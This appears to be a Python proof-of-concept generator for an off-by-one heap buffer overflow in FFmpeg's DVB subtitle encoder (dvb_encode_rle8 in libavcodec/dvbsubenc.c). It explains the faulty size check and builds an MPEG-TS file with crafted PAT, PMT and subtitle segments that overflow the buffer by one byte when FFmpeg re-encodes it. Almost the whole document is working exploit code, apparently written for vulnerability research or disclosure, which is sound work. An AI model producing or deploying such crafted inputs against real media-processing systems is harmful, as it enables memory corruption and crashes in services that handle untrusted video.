#!/usr/bin/env python3
"""
PoC generator for off-by-one heap buffer overflow in dvb_encode_rle8().

File:     libavcodec/dvbsubenc.c
Function: dvb_encode_rle8(), lines 225-269
Bug:      The per-line size check at line 225 uses 24-bit (3-byte) overhead:
              if (buf_size * 8 < w * 12 + 24)
          but the actual maximum overhead is 32 bits (4 bytes):
              data_type(1) + worst_pixel_data + end_of_string(2) + end_of_line(1)

          For w=2 with alternating [nonzero, 0] pixels:
              0x12  0x01  0x00 0x01  0x00 0x00  0xF0  = 7 bytes
          Check: 6*8=48, 2*12+24=48 → NOT less than → check passes for buf_size=6
          Actual: 7 bytes written → off-by-one overflow at line 267 (*q++=0xF0)

Input:  MPEG-TS with DVB subtitle PES (native format, robust ffmpeg support).
Trigger: ffmpeg -i input.ts -c:s dvbsub output.ts
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(SCRIPT_DIR, "vuln_001_input.ts")

TS_PKT_SIZE = 188


# ---------------------------------------------------------------------------
# CRC32/MPEG-2 (polynomial 0x04C11DB7)
# ---------------------------------------------------------------------------

def crc32_mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for byte in data:
        crc ^= (byte << 24)
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc


# ---------------------------------------------------------------------------
# MPEG-TS packet helpers
# ---------------------------------------------------------------------------

def ts_pkt(pid: int, payload: bytes, pusi: bool = False, cc: int = 0) -> bytes:
    """Build a 188-byte TS packet (payload-only, no adaptation field)."""
    assert len(payload) <= 184
    # Pad to exactly 184 bytes
    if len(payload) < 184:
        # MPEG-TS stuffing: adaptation field with stuffing bytes
        # Use adaptation field (AFC=11) with stuffing to reach 184 bytes of total
        stub_len = 184 - len(payload) - 2  # -2 for AF length + flags bytes
        if stub_len >= 0:
            af = bytes([stub_len + 1, 0x00]) + bytes(stub_len)  # length, flags, stuffing
            afc = 0b11
        else:
            # Not enough room for even a 1-byte AF → add single-byte AF with no content
            # This means payload must be exactly 183 bytes to fit afc=11 AF(length=1)+payload
            # Simpler: just zero-pad the payload and use afc=01
            af = b''
            afc = 0b01
            payload = payload + bytes(184 - len(payload))
        if af:
            raw = af + payload
        else:
            raw = payload
    else:
        afc = 0b01
        raw = payload

    b1 = 0x47
    b2 = ((0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F))
    b3 = pid & 0xFF
    b4 = (afc << 4) | (cc & 0xF)
    hdr = bytes([b1, b2, b3, b4])
    pkt = hdr + raw
    assert len(pkt) == 188, f"bad TS pkt size {len(pkt)}"
    return pkt


def ts_pkt_padded(pid: int, payload: bytes, pusi: bool = False, cc: int = 0) -> bytes:
    """TS packet using adaptation-field stuffing to reach exactly 188 bytes."""
    assert len(payload) <= 184
    if len(payload) == 184:
        # payload-only
        b2 = (0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)
        b3 = pid & 0xFF
        b4 = (0b01 << 4) | (cc & 0xF)
        return bytes([0x47, b2, b3, b4]) + payload

    # Need padding: use adaptation field
    # Adaptation field: [af_length][flags][...stuffing...]
    # We need: 4 (header) + af_length+1 + len(payload) = 188
    # So: af_length = 188 - 4 - 1 - len(payload) = 183 - len(payload)
    af_length = 183 - len(payload)
    if af_length == 0:
        # degenerate: af_length=0 means empty adaptation field
        af = bytes([0x00])  # adaptation_field_length=0, no content
    else:
        # af_length >= 1: flags byte + (af_length-1) stuffing bytes
        af = bytes([af_length, 0x00]) + bytes(af_length - 1)  # flags=0, stuffing

    b2 = (0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)
    b3 = pid & 0xFF
    b4 = (0b11 << 4) | (cc & 0xF)  # AFC=11: adaptation + payload
    pkt = bytes([0x47, b2, b3, b4]) + af + payload
    assert len(pkt) == 188, f"ts pkt size {len(pkt)}"
    return pkt


# ---------------------------------------------------------------------------
# PAT - Program Association Table
# ---------------------------------------------------------------------------

def make_pat(tsid: int = 1, prog: int = 1, pmt_pid: int = 64) -> bytes:
    """One TS packet containing the PAT section."""
    # Section body (from tsid to last program entry, before CRC32):
    body = (
        struct.pack('>H', tsid) +   # transport_stream_id
        bytes([0xC1]) +             # reserved(2)=11, version=0, current_next=1
        bytes([0x00]) +             # section_number
        bytes([0x00]) +             # last_section_number
        struct.pack('>H', prog) +   # program_number
        struct.pack('>H', 0xE000 | pmt_pid)   # reserved(3)+PMT_PID(13)
    )
    # section_length = len(body) + 4 (CRC) = 9 + 4 = 13
    sec_len = len(body) + 4
    header = bytes([0x00, 0xB0 | (sec_len >> 8), sec_len & 0xFF])
    section_data = header + body
    crc = crc32_mpeg2(section_data)
    section = section_data + struct.pack('>I', crc)

    payload = bytes([0x00]) + section   # pointer_field = 0
    return ts_pkt_padded(pid=0, payload=payload, pusi=True, cc=0)


# ---------------------------------------------------------------------------
# PMT - Program Map Table
# ---------------------------------------------------------------------------

def make_pmt(pmt_pid: int = 64, prog: int = 1, sub_pid: int = 256) -> bytes:
    """One TS packet containing the PMT section for a DVB subtitle stream."""
    # DVB subtitle descriptor (tag=0x59)
    # content: ISO 639 language + subtitling_type + composition_page_id + ancillary_page_id
    desc = bytes([
        0x59,               # descriptor_tag
        0x08,               # descriptor_length = 8
        ord('e'), ord('n'), ord('g'),   # ISO_639_language_code
        0x10,               # subtitling_type (0x10 = DVB subtitles, no AR)
        0x00, 0x01,         # composition_page_id = 1
        0x00, 0x01,         # ancillary_page_id = 1
    ])

    # ES info entry for DVB subtitle PID
    es_info = (
        bytes([0x06]) +                     # stream_type = PES private data
        struct.pack('>H', 0xE000 | sub_pid) +  # reserved(3)+elementary_PID(13)
        struct.pack('>H', 0xF000 | len(desc))  # reserved(4)+ES_info_length(12)
    ) + desc

    # PMT section body
    body = (
        struct.pack('>H', prog) +           # program_number
        bytes([0xC1]) +                     # reserved(2)=11, version=0, current_next=1
        bytes([0x00]) +                     # section_number
        bytes([0x00]) +                     # last_section_number
        struct.pack('>H', 0xFFFF) +         # reserved(3)=7 + PCR_PID(13)=0x1FFF (no PCR)
        struct.pack('>H', 0xF000)           # reserved(4)+program_info_length=0
    ) + es_info

    sec_len = len(body) + 4  # +4 for CRC
    header = bytes([0x02, 0xB0 | (sec_len >> 8), sec_len & 0xFF])
    section_data = header + body
    crc = crc32_mpeg2(section_data)
    section = section_data + struct.pack('>I', crc)

    payload = bytes([0x00]) + section   # pointer_field = 0
    return ts_pkt_padded(pid=pmt_pid, payload=payload, pusi=True, cc=0)


# ---------------------------------------------------------------------------
# DVB subtitle PES packet
# ---------------------------------------------------------------------------

def build_dvb_subtitle_segments(page_version: int = 0) -> bytes:
    """
    Build DVB subtitle segments for a 2x2 8-bpp bitmap, pixels=[1,0].

    When ffmpeg re-encodes with -c:s dvbsub:
      nb_colors = 1<<8 = 256 (from region->depth=8) → dvb_encode_rle8 selected
      For each 1-row field, pixels [1,0]:
        check:  buf_size*8 < 2*12+24 → passes if buf_size >= 6
        writes: 0x12 0x01 0x00 0x01 0x00 0x00 0xF0 = 7 bytes  ← off-by-one

    page_version: 0-15; use different versions per packet so the page
    version check (ctx->version == version → return) does not skip packets.
    """
    PAGE_ID = 0x0001

    def seg(seg_type: int, payload: bytes) -> bytes:
        return bytes([0x0F, seg_type]) + struct.pack('>HH', PAGE_ID, len(payload)) + payload

    # Page Composition (0x10): 1 region at (0,0)
    # Byte 1: timeout=30=0x1E
    # Byte 2: version(4b)|page_state(2b)|reserved(2b)
    #   page_state=2 (mode_change) = 0b10 → bits 3:2 = 10
    #   version in bits 7:4; reserved in bits 1:0 = 11
    #   value = (page_version << 4) | (2 << 2) | 3 = (page_version<<4)|0x0B
    page_byte = ((page_version & 0xF) << 4) | 0x0B
    page_seg = seg(0x10, bytes([
        0x1E, page_byte,    # timeout=30, version=page_version|state=mode_change
        0x00, 0xFF,         # region_id=0, reserved
        0x00, 0x00, 0x00, 0x00,   # region_x=0, region_y=0
    ]))

    # Region Composition (0x11): w=2, h=2, depth=8bpp
    # Depth byte 0x6F: (0x6F>>2)&7 = (0x1B)&7 = 3 → 1<<3 = 8
    # region version byte: version(4b)|fill(1b)|reserved(3b) = (page_version<<4)|0x07
    region_ver_byte = ((page_version & 0xF) << 4) | 0x07
    region_seg = seg(0x11, bytes([
        0x00, region_ver_byte,  # region_id=0, version=page_version|fill=0|reserved=7
        0x00, 0x02,         # width=2
        0x00, 0x02,         # height=2
        0x6F,               # depth byte → region->depth = 8
        0x00,               # clut_id=0
        0x00, 0x00,         # bgcolor(8bpp)=0, skip
        # Object entry:
        0x00, 0x00,         # object_id=0
        0x00, 0x00,         # type=0, x_pos=0
        0xF0, 0x00,         # reserved=0xF, y_pos=0
    ]))

    # CLUT Definition (0x12): 2 entries with 8-bpp flag (depth & 0x20)
    clut_seg = seg(0x12, bytes([
        0x00, 0xF0,         # clut_id=0, version=15
        0x00, 0x21, 0x00, 0x80, 0x80, 0xFF,   # idx=0, 8bpp+full_range, transparent
        0x01, 0x21, 0xEB, 0x80, 0x80, 0x00,   # idx=1, 8bpp+full_range, white opaque
    ]))

    # Object Data (0x13): 2x2 bitmap, top=[1,0], bottom=[1,0]
    # 8-bpp pixel string for [1, 0]:
    #   0x12: data_type
    #   0x01: pixel index 1 (non-zero, written as-is)
    #   0x00 0x01: escape + run_length=1, bit7=0 → 1 pixel of index 0
    #   0x00 0x00: escape + run_length=0 → end of string
    #   0xF0: end-of-display-line
    field = bytes([0x12, 0x01, 0x00, 0x01, 0x00, 0x00, 0xF0])
    obj_payload = bytes([0x00, 0x00, 0x01]) + struct.pack('>HH', len(field), len(field)) + field + field
    obj_seg = seg(0x13, obj_payload)

    # End of Display Set (0x80)
    end_seg = seg(0x80, b'')

    return page_seg + region_seg + clut_seg + obj_seg + end_seg


def make_pes(sub_pid_stream_id: int, pts: int, dvb_data: bytes) -> bytes:
    """
    Build a DVB subtitle PES packet for MPEG-TS.
    stream_id=0xBD (private_stream_1).

    The ffmpeg mpegts demuxer passes the raw PES payload directly to avcodec_decode_subtitle2.
    The dvbsub decoder checks buf[0] == 0x0F (sync byte), so the payload must start with
    the raw DVB subtitle segments — WITHOUT the data_identifier (0x20) prefix.
    """
    # PTS: 5-byte encoding
    pts &= 0x1FFFFFFFF
    p = [
        0x21 | ((pts >> 29) & 0x0E),
        (pts >> 22) & 0xFF,
        0x01 | ((pts >> 14) & 0xFE),
        (pts >> 7) & 0xFF,
        0x01 | ((pts << 1) & 0xFE),
    ]

    pes_header = bytes([0x80, 0x80, 0x05]) + bytes(p)   # flags: PTS only, header_len=5

    # DVB subtitle PES payload: raw segments starting directly with 0x0F
    # (dvbsub_decode checks buf[0] == 0x0F; mpegts demuxer does NOT strip data_identifier)
    pes_payload_data = dvb_data

    pes_packet_length = len(pes_header) + len(pes_payload_data)

    pes = bytes([0x00, 0x00, 0x01, 0xBD]) + struct.pack('>H', pes_packet_length) + pes_header + pes_payload_data
    return pes


def pes_to_ts_packets(pid: int, pes: bytes) -> bytes:
    """Split PES into 188-byte TS packets."""
    pkts = []
    offset = 0
    pusi = True
    cc = 1

    while offset < len(pes):
        chunk = pes[offset:offset + 184]
        pkt = ts_pkt_padded(pid=pid, payload=chunk, pusi=pusi, cc=cc & 0xF)
        pkts.append(pkt)
        offset += len(chunk)
        pusi = False
        cc += 1

    return b''.join(pkts)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def build_mpegts() -> bytes:
    PMT_PID = 64
    SUB_PID = 256

    # PAT+PMT only once at the start — repeated PMT triggers
    # "Demuxer context update while decoder is open" which disrupts decode pipeline
    pat = make_pat(tsid=1, prog=1, pmt_pid=PMT_PID)
    pmt = make_pmt(pmt_pid=PMT_PID, prog=1, sub_pid=SUB_PID)

    # 8 subtitle packets with different page versions (0-7)
    # so ctx->version != version check passes for each packet
    # PTS spaced 1s apart (90000 ticks each)
    sub_packets = b''
    for i in range(8):
        segs = build_dvb_subtitle_segments(page_version=i)
        pes = make_pes(SUB_PID, pts=i * 90000, dvb_data=segs)
        sub_packets += pes_to_ts_packets(SUB_PID, pes)

    return pat + pmt + sub_packets


def main():
    segs = build_dvb_subtitle_segments(page_version=0)
    ts_data = build_mpegts()

    with open(OUT_FILE, 'wb') as f:
        f.write(ts_data)

    print(f"[+] Generated: {OUT_FILE}")
    print(f"[+] Total size: {len(ts_data)} bytes ({len(ts_data)//188} TS packets)")
    print(f"[+] DVB subtitle segments per packet: {len(segs)} bytes")
    print(f"[+] Trigger parameters:")
    print(f"    - rect width=2, height=2, nb_colors=256 (8-bpp region)")
    print(f"    - pixel pattern: [1, 0] alternating in both rows")
    print(f"    - dvb_encode_rle8 called for top and bottom fields")
    print(f"    - Buggy check: buf_size*8 < 48 passes for buf_size=6")
    print(f"    - Actual bytes written per row: 7 (off-by-one at *q++=0xF0)")


if __name__ == '__main__':
    main()
